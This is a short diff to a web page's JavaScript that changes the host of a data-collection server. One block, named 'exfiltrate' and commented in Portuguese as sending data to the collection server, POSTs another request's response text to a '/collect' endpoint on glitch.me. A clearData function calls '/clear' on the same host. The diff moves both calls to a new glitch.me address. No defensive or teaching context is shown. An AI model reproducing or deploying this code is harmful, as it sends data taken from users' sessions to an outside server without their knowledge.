@@ -55,7 +55,7 @@
                         statusDiv.style.backgroundColor = '#e0ffe0';
                         // Enviar dados para o servidor de coleta
                         var exfiltrate = new XMLHttpRequest();
-                        exfiltrate.open('POST', 'https://potent-intriguing-dichondra.glitch.me/collect', true);
+                        exfiltrate.open('POST', 'https://cyclic-magical-ankle.glitch.me/collect', true);
                         exfiltrate.setRequestHeader('Content-Type', 'application/json');
                         exfiltrate.send(JSON.stringify({data: xhr.responseText}));
                     } else {
@@ -77,7 +77,7 @@
 
         function clearData() {
             var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://potent-intriguing-dichondra.glitch.me/clear', true);
+            xhr.open('POST', 'https://cyclic-magical-ankle.glitch.me/clear', true);
             xhr.onreadystatechange = function() {
                 if (xhr.readyState == 4) {
                     var statusDiv = document.getElementById('status');
